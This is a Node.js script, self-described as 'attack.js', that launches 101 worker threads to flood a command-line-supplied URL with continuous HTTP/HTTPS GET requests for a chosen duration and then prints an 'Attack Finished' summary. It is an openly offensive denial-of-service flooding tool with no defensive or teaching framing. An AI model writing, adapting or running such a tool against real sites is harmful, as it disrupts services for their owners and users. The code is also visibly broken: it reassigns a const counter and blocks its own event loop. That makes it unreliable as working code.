const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

if (isMainThread) {
    const target = process.argv[2];
    const duration = parseInt(process.argv[3], 10);
    const threadCount = 101;

    if (!target || !duration) {
        console.error('Usage: node attack.js <target> <duration_in_seconds>');
        process.exit(1);
    }

    let totalSent = 0;
    let totalSuccess = 0;

    // Spawn workers
    for (let i = 0; i < threadCount; i++) {
        const worker = new Worker(__filename, {
            workerData: { target, duration }
        });

        worker.on('message', (msg) => {
            if (msg.type === 'tick') {
                totalSent += msg.sent;
                totalSuccess += msg.success;
            }
        });

        worker.on('exit', () => {
            threadCount--;
            if (threadCount === 0) {
                console.log(`\n=== Attack Finished ===`);
                console.log(`Total Sent: ${totalSent}`);
                console.log(`Success: ${totalSuccess}`);
            }
        });
    }

} else {
    const http = require('http');
    const https = require('https');
    const { target, duration } = workerData;

    const endTime = Date.now() + duration * 1000;
    let sent = 0;
    let success = 0;

    const parsedUrl = new URL(target);
    const isHttps = parsedUrl.protocol === 'https:';

    const options = {
        hostname: parsedUrl.hostname,
        port: isHttps ? 443 : 80,
        path: parsedUrl.pathname + parsedUrl.search,
        method: 'GET',
        headers: {
            'Host': parsedUrl.hostname,
            'Connection': 'keep-alive',
        }
    };

    const protocol = isHttps ? https : http;

    function flood() {
        while (Date.now() < endTime) {
            const req = protocol.request(options, (res) => {
                res.on('data', () => {}); // consume data
                res.on('end', () => {
                    success++;
                });
            });

            req.on('error', () => {});
            req.end();
            sent++;

            // Report progress every 10k requests
            if (sent % 10000 === 0) {
                parentPort.postMessage({ type: 'tick', sent: 10000, success });
                success = 0;
            }
        }

        // Final report
        parentPort.postMessage({ type: 'tick', sent: sent % 10000, success });
        process.exit(0);
    }

    flood();
}
